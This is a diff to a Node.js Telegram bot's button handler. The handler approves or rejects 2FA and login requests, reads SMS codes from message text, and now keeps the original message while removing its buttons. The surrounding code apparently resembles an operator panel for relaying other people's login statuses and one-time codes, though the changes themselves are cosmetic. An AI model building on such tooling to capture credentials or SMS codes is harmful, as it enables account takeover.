@@ -189,7 +189,7 @@ bot.on("callback_query", async (query) => {
     const [action, identifier] = query.data.split("|");
     let status;
 
-    // --- Handle 2FA approve/reject separately ---
+    // --- Handle 2FA approve/reject ---
     if (action === "2fa_approve" || action === "2fa_reject") {
       const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
       const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";
@@ -200,7 +200,7 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
-      // Remove buttons from original message (keep info visible)
+      // Step 1: Remove buttons, keep info message visible
       try {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -211,7 +211,7 @@ bot.on("callback_query", async (query) => {
         );
       } catch (_) {}
 
-      // Send status as a new message below
+      // Step 2: Send status below
       const msgText = query.message.text || "";
       const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
@@ -246,12 +246,18 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Delete original message
+    // Step 1: ✅ Remove buttons but KEEP the original info message visible
     try {
-      await bot.deleteMessage(query.message.chat.id, query.message.message_id);
+      await bot.editMessageReplyMarkup(
+        { inline_keyboard: [] },
+        {
+          chat_id: query.message.chat.id,
+          message_id: query.message.message_id
+        }
+      );
     } catch (_) {}
 
-    // Send standalone status message
+    // Step 2: Send status below the original message
     const isSMS = /^\d+$/.test(identifier);
     const replyText = isSMS
       ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
